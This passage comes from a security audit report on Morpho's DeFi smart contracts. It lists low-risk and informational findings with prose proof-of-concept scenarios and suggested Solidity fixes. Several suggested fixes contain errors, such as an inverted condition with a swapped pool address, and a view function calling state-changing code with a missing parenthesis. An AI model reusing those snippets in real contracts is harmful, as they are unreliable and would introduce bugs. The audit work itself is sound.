This vulnerability poses a risk of potential user fund loss when `paybackAmount < token.balanceOf(bundler)`. Users, adhering to the `aaveV3Repay()` documentation, may construct their multicall with the assumption that the bundler uses all remaining funds for repayment. However, the bundler retains the difference, leaving it inside and open to theft by any entity calling the bundler.

- POC

To illustrate the potential issue, consider the following scenario:

1. A user initiates a series of bundled calls, culminating in a call to `aaveV3Repay()` with the parameter `type(uint256).max`. The objective is to use the 10 remaining tokens, after the execution of prior calls, to settle a debt.
2. The call is directed to Aave, indicating `type(uint256).max` to express the intent of utilizing the entire remaining balance in the bundler. The function snippet is outlined below:

```solidity
function aaveV3Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
	if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	
	_approveMaxTo(asset, address(AAVE_V3_POOL));
	
	AAVE_V3_POOL.repay(asset, amount, interestRateMode, initiator());
}
```

3. Aave interprets the `type(uint256).max` parameter, calculating the total outstanding debt the user has (e.g., 5 tokens).
4. Aave proceeds to withdraw the 5 tokens from the bundler using the `transferFrom()` method.
5. The multicall execution concludes.
6. Contrary to the user's intention of full repayment, 5 tokens persist within the contract, posing a potential vulnerability for unauthorized entities to appropriate them.

- Recommendation:

To align with the intended functionality, adjustments are needed in the implementation of `aaveV3Repay()`, specifically by adapting the conditional statement around the reduction of the amount. A refined example is provided below:

```solidity
function aaveV3Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
	if (amount == type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	
	_approveMaxTo(asset, address(AAVE_V2_POOL));
	
	AAVE_V3_POOL.repay(asset, amount, interestRateMode, initiator());
}
```




### Setting MetaMorpho as the feerecipient will lead to incorrect calculations

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L613-L613](metamorpho/src/MetaMorpho.sol#L613-L613)

- Bug Description

In MetaMorpho, the function named `_accruedFeeShares()` is responsible for determining the shares the fee recipient earns. This function is used to assess MetaMorpho's total assets within its markets, by calling the `totalAssets()` function:

```solidity
/// @inheritdoc IERC4626
function totalAssets() public view override returns (uint256 assets) {
	for (uint256 i; i < withdrawQueue.length; ++i) {
		assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
	}
}
```

The issue arises from the reliance on Morpho Blue's `expectedSupplyAssets()` function, which, as indicated in its documentation, carries a warning:

```solidity
/// @dev Warning: Wrong for `feeRecipient` because their supply shares increase is not taken into account.
```

This leads to an issue if MetaMorpho is set as the fee recipient of one of the underlying markets. The impact extends to various functions, such as `_accrueFee()`, `_convertToAssets()`, `_convertToShares()`, and `_maxWithdraw()`. Among these, the most consequential is the `_accrueFee()` function, integrated into ERC4626 functions like `deposit()`, `mint()`, `withdraw()`, and `redeem()`. Due to the flaw in `expectedSupplyAssets()`, neglecting shares minted to the fee recipient, these functions base their calculations solely on the market's assets, excluding fees accrued from being the fee recipient. This results in inaccuracies in subsequent calculations.
- Impact

This issue has significant repercussions. When users initiate a withdrawal or redemption, they will receive fewer assets per share than entitled. This discrepancy arises because the assets accrued by the fee recipient since the last interest accrual are omitted from the calculation.

Conversely, users making deposits or minting into the vault encounter an undeserved advantage. They receive more shares per asset than intended since the fees obtained are absent from the overall pool. This imbalance negatively affects the fairness and accuracy of user interactions with the MetaMorpho platform.

- POC 

To illustrate this issue, we can examine a straightforward scenario.

**Outline:**

- Users A & B
- Metamorpho
- Market 1 (Metamorpho is its fee recipient)

**Timeline:**

1. User A invests 100 tokens through Metamorpho into Market 1, obtaining 100 shares (sole investor in Metamorpho).
2. Over time, the market theoretically accrues 50 tokens of interest.
3. Distribution of interest: 10 tokens go to the fee recipient (Metamorpho), 20 to Metamorpho through normal interest, and 20 to other users.
4. No actual interest accrues between the deposit and the current state.
5. Two actions can occur, both leading to incorrect calculations:

**User A withdraws funds:**

- `totalAssets()` returns 120 (instead of the correct 130).
- User A initiates withdraw(100 shares) and receives 120 tokens.
- User A experiences a loss of 10 tokens.

**User B deposits funds:**

- `totalAssets()` returns 120 (instead of the correct 130).
- User B deposits 120 tokens, receiving 100 shares in return.
- User B accrues interest on the market.
- Suddenly, User B's 100 shares are valued at 125 tokens as the fee recipient shares are minted.
- User B exits the market with an instant profit of 5 tokens.

- Recommended Mitigation Steps

To address this issue, a straightforward mitigation involves a simple function call. The recommended solution is to invoke `accrueInterest()` once before accessing `expectedSupplyAssets()`. This adjustment ensures that `expectedSupplyAssets()` returns the correct value. The modification can be applied to the `totalAssets()` function as depicted below:

```solidity
/// @inheritdoc IERC4626
function totalAssets() public view override returns (uint256 assets) {
	for (uint256 i; i < withdrawQueue.length; ++i) {
		MORPHO.accrueInterest(_marketParams(withdrawQueue[i]);
		assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
	}
}
```

By incorporating this change, the `totalAssets()` function now accurately reflects the total assets, resolving the miscalculation introduced by the original oversight.



### functions non payable	_(duplicate of [`ERC20WrapperBundler.erc20WrapperDepositFor` not payable])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description** 

In the Bundler `BaseBundler.multicall` the devs say this. 

```
    /// @notice Executes a series of delegate calls to the contract itself.
    /// @dev Locks the initiator so that the sender can uniquely be identified in callbacks.
    /// @dev All functions delegatecalled must be `payable` if `msg.value` is non-zero.

```

But the function  in `ERC20WrapperBundler` abstract contract which inherit from the base bundler do not follow this descripton, as both functions are not payable. 

```
    function erc20WrapperDepositFor(address wrapper, uint256 amount) external protected {
        // @audit-issue should this not be payable as the multical function is payable
        ERC20 underlying = ERC20(address(ERC20Wrapper(wrapper).underlying()));

        amount = Math.min(amount, underlying.balanceOf(address(this)));
      

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(address(underlying), wrapper);
       
        ERC20Wrapper(wrapper).depositFor(initiator(), amount);
       
    }
```

```
 function erc20WrapperWithdrawTo(address wrapper, address account, uint256 amount) external protected {
        require(account != address(0), ErrorsLib.ZERO_ADDRESS);

        amount = Math.min(amount, ERC20(wrapper).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        ERC20Wrapper(wrapper).withdrawTo(account, amount);
    }
```

**Recommendation**

Make all functions called by multicall in bulder payable as required. 




## Informational risk
### Different solidity versions across the code base

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The different contracts under the umbrella are using all different compiler versions

 - Morpho.sol uses 0.8.19
 - ERC20PermissionedBase.sol uses 0.8.20
 - MetaMorpho.sol uses 0.8.21
 - AdaptiveCurveIrm.sol uses 0.8.19
 - ChainlinkOracle.sol uses 0.8.21
 - UniversalRewardsDistributor.sol uses 0.8.19

It would be nice all to be compiled using the same solidity version.



### Incorrect comment

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L49](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L49)

Incorrect comment, should be "Returns true if `account` has permission`.



### Floating dependency on OpenZeppelin

**Severity:** Informational

**Context:** [.gitmodules#L9-L9](universal-rewards-distributor/.gitmodules#L9-L9)

It is recommended to install a specific version of OpenZeppelin (either using NPM or a specific release accessible by branch)



### Possibly unnecessary extra dependency

**Severity:** Informational

**Context:** [.gitmodules#L6-L6](universal-rewards-distributor/.gitmodules#L6-L6)

Personal preference but generally recommended to reduce introducing new external dependencies

OpenZeppelin V5.0.0 should include equivalent code with similar gas usage



### Incorrect file extension

**Severity:** Informational

**Context:** [UniversalRewardsDistributorTest.sol#L15-L15](universal-rewards-distributor/test/UniversalRewardsDistributorTest.sol#L15-L15)

It is recommended to use the `.t.sol` extension for tests

https://book.getfoundry.sh/forge/tests



### Floating dependency on OpenZeppelin	_(duplicate of [Floating dependency on OpenZeppelin])_

**Severity:** Informational

**Context:** [.gitmodules#L7-L7](morpho-blue-oracles/.gitmodules#L7-L7)

It is recommended to install a specific version of OpenZeppelin (either using NPM or a specific release accessible by branch)



### Use `Ne18` rather than `N ether`

**Severity:** Informational

**Context:** [ExpLib.sol#L12-L12](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L12-L12)

Personal preference but replacing `ether` with `e18` would be more clear as we are not operating on `Ether` the asset and it relies on knowing the decimals.



### Solidity checks for type(uint256).max internally and skips allowance decrease

**Severity:** Informational

**Context:** [BaseBundler.sol#L92-L92](morpho-blue-bundlers/src/BaseBundler.sol#L92-L92)

Solmate internally checks for type(uint256).max

If it is set at `type(uint256).max` it actually does not decrease the allowance. Therefore this comment is correct but non-applicable.

https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol#L97



### Floating dependency on OpenZeppelin	_(duplicate of [Floating dependency on OpenZeppelin])_

**Severity:** Informational

**Context:** [.gitmodules#L4-L4](metamorpho/.gitmodules#L4-L4)

It is recommended to install a specific version of OpenZeppelin (either using NPM or a specific release accessible by branch)



### Named mappings should be used

**Severity:** Informational

**Context:** [MetaMorphoFactory.sol#L22-L22](metamorpho/src/MetaMorphoFactory.sol#L22-L22), [MetaMorpho.sol#L67-L67](metamorpho/src/MetaMorpho.sol#L67-L67), [MetaMorpho.sol#L73-L73](metamorpho/src/MetaMorpho.sol#L73-L73), [MetaMorpho.sol#L82-L82](metamorpho/src/MetaMorpho.sol#L82-L82), [AdaptiveCurveIrm.sol#L57-L57](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L57-L57), [UniversalRewardsDistributor.sol#L36-L36](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L36-L36), [UrdFactory.sol#L15-L15](universal-rewards-distributor/src/UrdFactory.sol#L15-L15)

**Description**:

The code utilizes mappings for various variables. To enhance code readability, it is advisable to use named mappings. If named mappings are not preferred, adding inline comments can still improve code readability.

**Recommendation**:

To address this issue, it is recommended to incorporate named mappings. An example would be:

```solidity
mapping(Id => mapping(address => Position)) public position;

// change to

mapping(Id marketId => mapping(address user => Position userPosition)) public position;
```

This adjustment improves the clarity of the code and makes it more understandable for developers.



### Incorrect description of `hasPermission()`	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L49](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L49)

**Description**:

The `hasPermission()` function is employed in ERC20Permissioned tokens to determine whether an address currently possesses permissions on the contract. This functionality can be utilized, for instance, to only permit trading between selected or whitelisted addresses. Although the function correctly implements this functionality, the comment erroneously states, "Returns true if `account` has no permission." Instead, it should state that the function returns true if an account has permissions.

**Recommendation**:

Update the comment to accurately reflect the function's behavior: "Returns true if `account` has permission."



### Solidity version can cause issues in L2s that do not support PUSH0 opcode

**Severity:** Informational

**Context:** [MetaMorpho.sol#L2-L2](metamorpho/src/MetaMorpho.sol#L2-L2), [MorphoBundler.sol#L2-L2](morpho-blue-bundlers/src/MorphoBundler.sol#L2-L2)

**Description**: Solidity version 0.8.20 introduced the use of the PUSH0 opcode. Deploying a contract compiled with Solidity 0.8.21 in chains that do not support the PUSH0 opcode might cause unexpected behaviors .

**Recommendation**: Lower solidity version to 0.8.19 in case the contract is meant to be deployed in chains that do not support PUSH0 opcode.



### Incorrect documentation of `onlyUpdaterRole` modifier

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L54-L54](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L54-L54)

**Description**:

The comment describing the `onlyUpdaterRole` modifier suggests that it will revert if the caller lacks the updater role. However, the modifier does not revert if the caller is the owner. Moreover, the comment is grammatically incorrect.

**Recommendation**:

Correct the comment to accurately reflect the behavior: "@notice Reverts if the caller does not have the updater role and is not the owner."



### Incorrect grammar in description of `setRoot()`

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L138-L138](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L138-L138)

**Description**:

The existing comment for the `setRoot()` function contains a grammatically incorrect phrase: "Forces update the root of a given distribution (bypassing the timelock)". To enhance clarity and adherence to proper grammar, it is advisable to rephrase the comment. 

**Recommendation**:
The corrected version could read as follows: "Forcibly updates the root of this URD (bypassing the timelock)" This revised comment more accurately conveys the intended meaning and ensures grammatical correctness.



### Wrong comment

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L42-L42](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L42-L42)

The comment should be "..._the root can be **accepted** after the timelock has expired_".



### Wrong comment	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L49](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L49)

The comment should be "_Returns true if `account` has ~~no~~ permission_".



### Duplicate events will get generated

**Severity:** Informational

**Context:** [UrdFactory.sol#L26-L45](universal-rewards-distributor/src/UrdFactory.sol#L26-L45)

Calling the function with same parameter will still generate UrdCreated event. If these events are being listened then duplicate events should be ignored

Recommendation:
Add below check:

```
if(isUrd[address(urd)])
revert ...
```



### Missing NatSpec explaining that the loan token must be already present in the contract. 

**Severity:** Informational

**Context:** [MorphoBundler.sol#L237-L237](morpho-blue-bundlers/src/MorphoBundler.sol#L237-L237)

**Description**:

As we have on other functions like `morphoSupply` a NatSpec explaining that the loan token funds should be present in the contract before calling this should be present.

**Recommendation**:

Consider adding a NatSpec to explain the right asset flow. 



### Non-Uniformly access to msg.sender in MetaMorpho modifiers

**Severity:** Informational

**Context:** [MetaMorpho.sol#L140-L140](metamorpho/src/MetaMorpho.sol#L140-L140), [MetaMorpho.sol#L148-L148](metamorpho/src/MetaMorpho.sol#L148-L148), [MetaMorpho.sol#L158-L158](metamorpho/src/MetaMorpho.sol#L158-L158), [MetaMorpho.sol#L165-L165](metamorpho/src/MetaMorpho.sol#L165-L165)

**Description**:

In the `MetaMorpho` contract, there are four modifiers. In the first two modifiers, the result of `_msgSender()` is stored in the variable `sender`. However, in the next two modifiers, the result of `_msgSender()` is directly utilized. This inconsistency in the code structure may impact its readability and maintenance.

**Recommendation**:

To maintain code uniformity and enhance readability, it is recommended to choose a consistent approach throughout the contract. You can either consistently use the pattern `address sender = _msgSender();` in all modifiers or opt for using the result of `_msgSender()` directly in all modifiers.




### Incorrect documentation of `onlyCuratorRole` modifier

**Severity:** Informational

**Context:** [MetaMorpho.sol#L138-L138](metamorpho/src/MetaMorpho.sol#L138-L138)

**Description**:

The comment describing the `onlyCuratorRole` modifier currently states that it reverts if the caller does not have the curator role. However, this is not entirely accurate as it also does not revert if the caller is the owner.

**Recommendation**:

To provide an accurate description, update the comment to the following: "/// @dev Reverts if the caller doesn't have the curator role and is not the owner."




### Incorrect documentation of `onlyAllocatorRole` modifier

**Severity:** Informational

**Context:** [MetaMorpho.sol#L146-L146](metamorpho/src/MetaMorpho.sol#L146-L146)

**Description**:

The comment describing the `onlyAllocatorRole` modifier currently states that it reverts if the caller does not have the allocator role. However, this is not entirely accurate as it also does not revert if the caller is the owner or the curator.

**Recommendation**:

To provide an accurate description, update the comment to the following: "/// @dev Reverts if the caller doesn't have the allocator role or curator role and is not the owner."




### Incorrect documentation of `onlyGuardianRole modifier`

**Severity:** Informational

**Context:** [MetaMorpho.sol#L156-L156](metamorpho/src/MetaMorpho.sol#L156-L156)

**Description**:

The comment describing the `onlyGuardianRole` modifier currently states that it reverts if the caller does not have the guardian role. However, this is not entirely accurate as it also does not revert if the caller is the owner.

**Recommendation**:

To provide an accurate description, update the comment to the following: "/// @dev Reverts if the caller doesn't have the guardian role and is not the owner."




### Incorrect documentation of `onlyCuratorOrGuardianRole` modifier

**Severity:** Informational

**Context:** [MetaMorpho.sol#L163-L163](metamorpho/src/MetaMorpho.sol#L163-L163)

**Description**:

The comment describing the `onlyCuratorOrGuardianRole` modifier currently states that it reverts if the caller does not have the curator or guardian role. However, this is not entirely accurate as it also does not revert if the caller is the owner.

**Recommendation**:

To provide an accurate description, update the comment to the following: "/// @dev Reverts if the caller doesn't have the curator nor the guardian role and is not the owner."



### Overloading of the `update()` function introduces unneeded complexity

**Severity:** Informational

**Context:** [PendingLib.sol#L34-L34](metamorpho/src/libraries/PendingLib.sol#L34-L34), [PendingLib.sol#L42-L42](metamorpho/src/libraries/PendingLib.sol#L42-L42)

**Description**:

The MetaMorpho contract relies on the `PendingLib` contract to update pending addresses and uint192s. The library currently has two functions with identical names, both named `update()`. One of these functions is designed for addresses, while the other is intended for uint192s. This naming convention may lead to confusion and potential errors for developers in the future.

**Recommendation**:

To enhance clarity and prevent future mistakes, consider renaming the two functions to `updateAddress()` and `updateUint192()` respectively.



### Incorrect comment

**Severity:** Informational

**Context:** [MetaMorpho.sol#L306-L306](metamorpho/src/MetaMorpho.sol#L306-L306)

The comment is incorrect as funds are not lost. They could be retrieved back using below:

1. Using reallocate function to reallocate funds from removed market to another market
2. By removing the market from withdraw queue after "removableAt" period has elapsed and then adding the market back by changing its supply cap



### Funds can be lost

**Severity:** Informational

**Context:** [MetaMorpho.sol#L300-L300](metamorpho/src/MetaMorpho.sol#L300-L300)

Setting timelocked cap does not check whether the market id is currently marked for removal. This could lead to loss of funds due to deposits being allowed on an removed market

- Steps
1. Curator set supplyCap for market A as 100 with timelock
2. After some time (timelock has not elapsed yet), Curator decides to remove market A using `submitMarketRemoval`
3. Timelock completes for step 1 and market A supplyCap resume to 100 even though market is marked for removal
4. Deposit could be made to this market which is risky since Curator may turn supply back to 0 once they realize the mistake and at that time if `config[id].removableAt` period has elapsed then market can be removed completely which means funds are gone (until allocator reallocates or market is readded)

- Recommendation
Changing supplyCap should check if market is not marked for removal




### Just testing, ignore

**Severity:** Informational

**Context:** [MetaMorpho.sol#L250-L250](metamorpho/src/MetaMorpho.sol#L250-L250), [MetaMorpho.sol#L278-L278](metamorpho/src/MetaMorpho.sol#L278-L278)

**Description**:

**Recommendation**:



### Incorrect documentation of setting a guardian

**Severity:** Informational

**Context:** [MetaMorpho.sol#L265-L265](metamorpho/src/MetaMorpho.sol#L265-L265)

**Description:**

The MetaMorpho documentation, located in the `Readme.md` file, inaccurately asserts that setting a guardian through the owner is subject to a timelock. This is conveyed by the statement "[Timelocked] Set the guardian." However, this information is misleading, as the update is not timelocked when no guardian is currently set, as indicated by the `guardian == address(0)` check.

**Recommendation:**

To rectify this discrepancy, it is advisable to split the description into two distinct parts, mirroring the approach taken for the timelock. This can be achieved through the following adaption of the documentation:
- Set the first guardian
- [Timelocked] Change the guardian.



### Incorrect documentation regarding the withdrawQueue	_(duplicate of [Inaccurate assumptions for `updateWithdrawQueue`])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L346-L346](metamorpho/src/MetaMorpho.sol#L346-L346)

**Description**:

The MetaMorpho documentation, located in `Readme.md`, inaccurately asserts that "The withdrawQueue contains all markets that have a non-zero cap or a non-zero vault allocation." This statement is incorrect, as a market's cap can be reduced to 0, and the market can be fully emptied while still persisting in the withdrawalQueue untilit gets removed using `updateWithdrawQueue()`.

**Recommendation**:

To address this inaccuracy, it is advisable to remove the mentioned sentence from the documentation.



### Doc mismatch	_(duplicate of [Doc mismatch])_

**Severity:** Informational

**Context:** [README.md#L31-L31](metamorpho/README.md#L31-L31)

The minimum timelock is not 12 but 24 hours (`1 days`) according to `ConstantsLib`.



### Doc mismatch

**Severity:** Informational

**Context:** [README.md#L31-L31](metamorpho/README.md#L31-L31), [README.md#L51-L51](metamorpho/README.md#L51-L51)

Increasing the fee is not a subject to a timelock - it changes instantly.



### Typos in `gardian`

**Severity:** Informational

**Context:** [MetaMorpho.sol#L263-L264](metamorpho/src/MetaMorpho.sol#L263-L264)

3 typos: _gardian_ should be _guardian_



### Doc mismatch

**Severity:** Informational

**Context:** [README.md#L106-L106](metamorpho/README.md#L106-L106)

Oracle should be not _arbitrary_ but exactly `address(0)`, an arbitrary oracle could potentially allow borrowing using no collateral token (`address(0)`).



### Doc mismatch	_(duplicate of [Inaccurate assumptions for `updateWithdrawQueue`])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L343-L343](metamorpho/src/MetaMorpho.sol#L343-L343), [MetaMorpho.sol#L344-L344](metamorpho/src/MetaMorpho.sol#L344-L344)

The function name was updated from `sortWithdrawQueue` to `updateWithdrawQueue`, but the comments still contain the old name.





### Incorrect comment	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L49](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L49)

**Description**: Incorrect comment. Function returns true if the account has permission. Also reflected in how the function output is handled in the `_update` function.



###  This statement is inaccurate, as the owner has the ability to  pass this modifier check

**Severity:** Informational

**Context:** [MetaMorpho.sol#L138-L138](metamorpho/src/MetaMorpho.sol#L138-L138), [MetaMorpho.sol#L149-L149](metamorpho/src/MetaMorpho.sol#L149-L149)

**Description**:
The comment is inaccurate in asserting that only the curator can invoke it, as the owner also possesses this capability. This could pose a concern, especially if there is an issue with complete trust in the owner
**Recommendation**:
Fix comment to either say the owner can call it or change the modifier 



### `setFee()` and `setFeeRecipient()` incorrectly update `lastTotalAssets` which leads to higher fee than intended

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
How protocol fee is accrued in Metamorpho? Protocol fee is taken from accrued interest. Accrued interest is the difference between current `totalAssets()` and `lastTotalAssets`. `lastTotalAssets` is value of `totalAssets()` on previous accrual.
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L912-L925
```solidity
    /// @dev Computes and returns the fee shares (`feeShares`) to mint and the new vault's total assets
    /// (`newTotalAssets`).
    function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
        newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
        if (totalInterest != 0 && fee != 0) {
            uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
            // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
            // that total assets is already increased by the total interest (including the fee assets).
            feeShares =
                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
        }
    }
```

Note that `totalAssets()` of Metamorpho can decrease in case bad debt socialization occurs in Morpho Blue, because `totalSupplyAssets` is reduced:
https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L387-L398
```solidity
    function liquidate(
        MarketParams memory marketParams,
        address borrower,
        uint256 seizedAssets,
        uint256 repaidShares,
        bytes calldata data
    ) external returns (uint256, uint256) {
    ...
        if (position[id][borrower].collateral == 0) {
            badDebtShares = position[id][borrower].borrowShares;
            uint256 badDebt = UtilsLib.min(
                market[id].totalBorrowAssets,
                badDebtShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares)
            );

            market[id].totalBorrowAssets -= badDebt.toUint128();
@>          market[id].totalSupplyAssets -= badDebt.toUint128();
            market[id].totalBorrowShares -= badDebtShares.toUint128();
            position[id][borrower].borrowShares = 0;
        }
    ...
    }
```

It means that after bad debt socialization, Metamorpho will continue to accrue fee after receiving amount of interest equal to socialized bad debt. Morpho team called it "fee on performance". For example:
1) Metamorpho has 600 assets, `lastTotalSupplied = 600`
2) Bad debt socialization decreases Metamorpho's assets to 500
3) Metamorpho will continue to accrue fee only after interest equal to `600 - 500 = 100` is accrued

However this behaviour will be broken if admin calls `setFee()` or `setFeeRecipient()`. Because this function override `lastTotalAssets` with current value of `totalAssets`. Suppose one of these functions was called after Step 2 in above example. It means protocol will accrue fee while it should not .
```solidity
    function setFee(uint256 newFee) external onlyOwner {
        ...

        // Accrue interest using the previous fee set before changing it.
        _updateLastTotalAssets(_accrueFee());

        ...
    }

    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        ...

        // Accrue interest to the previous fee recipient set before changing it.
        _updateLastTotalAssets(_accrueFee());

        ...
    }
```

- Recommendation
Override `lastTotalAssets` only if protocol is not in "fee on performance" state:
```diff
    /// @notice Sets the `fee` to `newFee`.
    function setFee(uint256 newFee) external onlyOwner {
        if (newFee == fee) revert ErrorsLib.AlreadySet();
        if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
        if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

        // Accrue interest using the previous fee set before changing it.
+       uint256 newTotalAssets = _accrueFee();
+       if (newTotalAssets > lastTotalAssets) {
+           _updateLastTotalAssets(newTotalAssets);
+       }
-       _updateLastTotalAssets(_accrueFee());

        // Safe "unchecked" cast because newFee <= MAX_FEE.
        fee = uint96(newFee);

        emit EventsLib.SetFee(_msgSender(), fee);
    }

    /// @notice Sets `feeRecipient` to `newFeeRecipient`.
    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        if (newFeeRecipient == feeRecipient) revert ErrorsLib.AlreadySet();
        if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();

+       uint256 newTotalAssets = _accrueFee();
+       if (newTotalAssets > lastTotalAssets) {
+           _updateLastTotalAssets(newTotalAssets);
+       }
-       _updateLastTotalAssets(_accrueFee());

        feeRecipient = newFeeRecipient;

        emit EventsLib.SetFeeRecipient(newFeeRecipient);
    }
```



### Increasing fees are not subject to a timelock period, changes are applied immediately	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Impact
- If the fees are increased, the new fee is applied immediately, it is not subject to the timelock period as [specified in the Readme](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/README.md#L31). This will cause the vault owner to start to earn more fees, thus, users will earn fewer rewards than what they are expecting. Increasing the fees is categorized as an action that may be against users' interests, so it should go through the timelock period.


- Proof of Concept
- When the [`MetaMorpho::setFee()` function]() is called, the new fee is validated to be correctly within the valid accepted boundaries for the fee, then accrues interests with the current fee, and finally, no matter if the new fee is greater than the current one, it proceeds to update the fee with the new value.
  - Updating the fee immediately no matter if it's greater than the previous one (fees are increased) doesn't allow users to take action if they are not okay with the new fee.

> MetaMorpho.sol
```solidity
function setFee(uint256 newFee) external onlyOwner {
    ...
    ...

    //@audit-issue => The fee is immediately updated no matter if it is greater than the previous fee
    // Safe "unchecked" cast because newFee <= MAX_FEE.
    fee = uint96(newFee);

    emit EventsLib.SetFee(_msgSender(), fee);
}
```

- Tools Used
Manual Audit

- Recommended Mitigation Steps
- Validate if the new fee is greater than the previous one, if so, put up the new fee subject to a timelock, and only until the timelock has passed, make effective the increase of the fees.

```solidity
function setFee(uint256 newFee) external onlyOwner {
    ...

    // Safe "unchecked" cast because newFee <= MAX_FEE.
-   fee = uint96(newFee);
  
    //@audit-info => If newFee > fee, put up the change subject to the timelock period!
+   if (uint96(newFee) > fee) {
+     if (uint96(newFee) == pendingFee.value) revert ErrorsLib.AlreadyPending();
+     pendingFee.update(uint184(newFee), timelock);
+   } else {
      //@audit-info => Only if the new fee is lower than the existing one, allow the change be applied immediately!
+     fee = uint96(newFee);
+   }

    ...
}



### Missing Explanatory Comment for Fallback Value in ChainlinkDataFeedLib's `getPrice` Function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Severity**

Informational - Low

**Relevant GitHub Links**

https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L21

**Summary**

The `ChainlinkDataFeedLib` library contains a design choice where the `getPrice` function returns `1` when the provided Chainlink feed address is zero. However, there is no comment explaining the rationale behind choosing `1` as the fallback value.

**Vulnerability Details**

In the `ChainlinkDataFeedLib` library, the `getPrice` function includes a fallback mechanism where it returns `1` if the provided Chainlink feed address is zero. While providing a fallback value is a reasonable design choice, there is no accompanying comment explaining why `1` specifically was chosen.

**Impact**

This issue has a minor impact on the functionality of the library. The lack of an explanatory comment might lead to confusion or misinterpretation of the design choice, especially for developers reviewing or modifying the code.

**Tools used**

- Manual review

**Recommendations**

It is recommended to add a comment in the `getPrice` function to explain the rationale behind choosing `1` as the fallback value when the Chainlink feed address is zero. This comment should provide clarity on the design choice and help future developers understand the intention behind the decision. Including explanatory comments for design choices is a good practice for enhancing code maintainability and collaboration.



### Unnecessary Import of `PendingAddress` in EventsLib Library

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity
INFORMATIONAL

- Relevant GitHub Links
- https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/libraries/EventsLib.sol#L6C9-L6C23

- Summary
The EventsLib library appears to import `PendingAddress` from `PendingLib.sol` but does not utilize it in any of its events or functions. This seems to be an unnecessary import.

- Vulnerability Details
The `PendingAddress` type is imported but not used within the EventsLib library. This may lead to confusion and unnecessary code complexity.

- Impact
The unused import does not pose a direct security risk, but it can potentially confuse developers reading the code, and it might introduce unnecessary complexity.

- Tools Used
- Manual review

- Recommendations
Consider removing the import statement for `PendingAddress` from the EventsLib library if it is not being used or planned for future use. This will improve code clarity and reduce unnecessary dependencies.





### Use `_approveMaxTo` in `StEthBundler`

**Severity:** Informational

**Context:** [StEthBundler.sol#L36-L36](morpho-blue-bundlers/src/StEthBundler.sol#L36-L36)

Could use `BaseBundler`'s `_approveMaxTo(ST_ETH, WST_ETH)`



### Code Comments Spelling Correction in `submitGuardian` function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity**

**Informational**

- **Relevant GitHub Links**

- https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L263
- https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L264
- **Summary**

